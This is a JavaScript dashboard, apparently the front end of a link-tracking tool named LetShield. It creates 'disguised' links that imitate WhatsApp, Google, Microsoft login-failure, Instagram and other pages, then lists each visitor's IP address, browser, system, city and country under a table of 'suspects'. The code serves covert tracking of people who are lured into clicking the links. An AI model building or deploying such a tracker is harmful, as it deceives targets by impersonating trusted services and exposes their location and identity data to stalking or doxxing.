// script.js — LetShield Dashboard aprimorado

function loadSuspects() {
  const tbody = document.getElementById("tbody");
  tbody.innerHTML = '<tr class="empty"><td colspan="4">Carregando...</td></tr>';

  fetch("/api/suspects", { credentials: "include" })
    .then((r) => r.json())
    .then((suspects) => {
      if (!suspects.length) {
        tbody.innerHTML = '<tr class="empty"><td colspan="4">Nenhum link criado ainda.</td></tr>';
        return;
      }

      const rows = suspects.map((item) =>
        fetch(`/api/suspect/${item.token}`, { credentials: "include" })
          .then((res) => res.json())
          .then((details) => {
            const date = new Date(item.created_at).toLocaleString();
            const token = item.token;
            const preset = guessPresetFromToken(token); // Temporário
            const message = escapeHtml(details.message || "Clique aqui");
            const link = `/go/${token}?preset=${preset}`;

            const tr = document.createElement("tr");
            tr.innerHTML = `
              <td data-label="Disfarce">${presetLabel(preset)}</td>
              <td data-label="Texto">
                <a href="${link}" target="_blank" rel="noopener noreferrer"
                   style="text-decoration:none;color:inherit;font-weight:600;">
                  ${message}
                </a>
              </td>
              <td data-label="Data">${date}</td>
              <td data-label="Ações">
                <button class="btn-analyze" data-token="${token}" title="Ver detalhes">🔎</button>
                <button class="btn-delete" data-token="${token}" title="Excluir">❌</button>
              </td>
            `;
            tbody.appendChild(tr);
          })
      );

      Promise.all(rows).then(() => attachListeners());
    })
    .catch(() => {
      tbody.innerHTML = '<tr class="empty"><td colspan="4">Erro ao carregar dados.</td></tr>';
    });
}

function attachListeners() {
  document.querySelectorAll(".btn-analyze").forEach((btn) => {
    btn.onclick = async () => {
      const token = btn.dataset.token;
      try {
        const res = await fetch(`/api/suspect/${token}`, { credentials: "include" });
        if (!res.ok) throw new Error();
        const d = await res.json();
        alert(`📌 Rastreamento:
• Texto: ${d.message}
• IP: ${d.ip}
• Navegador: ${d.browser}
• Sistema: ${d.platform}
• Cidade: ${d.city}
• País: ${d.country}`);
      } catch {
        alert("Erro ao abrir os detalhes.");
      }
    };
  });

  document.querySelectorAll(".btn-delete").forEach((btn) => {
    btn.onclick = async () => {
      if (!confirm("Excluir este rastreio?")) return;
      const token = btn.dataset.token;
      try {
        await fetch(`/api/suspect/${token}`, {
          method: "DELETE", credentials: "include"
        });
        loadSuspects();
      } catch {
        alert("Erro ao excluir.");
      }
    };
  });
}

// Auxiliares

function guessPresetFromToken(token) {
  return "layout"; // No futuro, podemos salvar isso no SUSPECTS_DB
}

function presetLabel(preset) {
  const map = {
    "404": "Erro 404",
    "whatsapp": "WhatsApp",
    "youtube_error": "YouTube",
    "google_expired": "Google",
    "login_failed": "Microsoft",
    "instagram_down": "Instagram",
    "twitter_offline": "Twitter",
    "blank": "Página em branco",
    "layout": "LetShield",
    "custom": "Custom"
  };
  return map[preset] || "–";
}

function escapeHtml(text) {
  return text.replace(/[<>&"]/g, (c) =>
    ({ "<": "&lt;", ">": "&gt;", "&": "&amp;", '"': "&quot;" }[c])
  );
}

loadSuspects();

const form        = document.getElementById("newTrackForm");
const msgInput    = document.getElementById("messageInput");
const presetSel   = document.getElementById("presetSelect");
const customInput = document.getElementById("customUrlInput");
const resultDiv   = document.getElementById("result");
const submitBtn   = document.getElementById("submitBtn");

presetSel.onchange = () => {
  customInput.style.display = presetSel.value === "custom" ? "block" : "none";
};

form.onsubmit = async (e) => {
  e.preventDefault();

  const message = msgInput.value.trim() || "Clique aqui";
  const preset  = presetSel.value;
  const custom  = customInput.value.trim();

  submitBtn.disabled = true;
  submitBtn.textContent = "Criando…";
  resultDiv.textContent = "";
  resultDiv.classList.remove("error");

  try {
    const res = await fetch("/api/new-track", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ message }),
      credentials: "include"
    });

    if (!res.ok) {
      const err = await res.json();
      throw new Error(err.detail || "Erro ao criar link");
    }

    const { url } = await res.json();
    const token = url.split("/").pop();
    let finalLink = `/go/${token}?preset=${preset}`;
    if (preset === "custom" && custom) {
      finalLink += `&custom=${encodeURIComponent(custom)}`;
    }

    resultDiv.innerHTML = `
      <p>
        <a href="${finalLink}" target="_blank" rel="noopener noreferrer"
           style="text-decoration:none;color:inherit;font-weight:600;">
          ${escapeHtml(message)}
        </a>
      </p>`;
    msgInput.value = "";
    customInput.value = "";
    loadSuspects();
  } catch (err) {
    resultDiv.textContent = err.message;
    resultDiv.classList.add("error");
  } finally {
    submitBtn.disabled = false;
    submitBtn.textContent = "Criar Link";
  }
};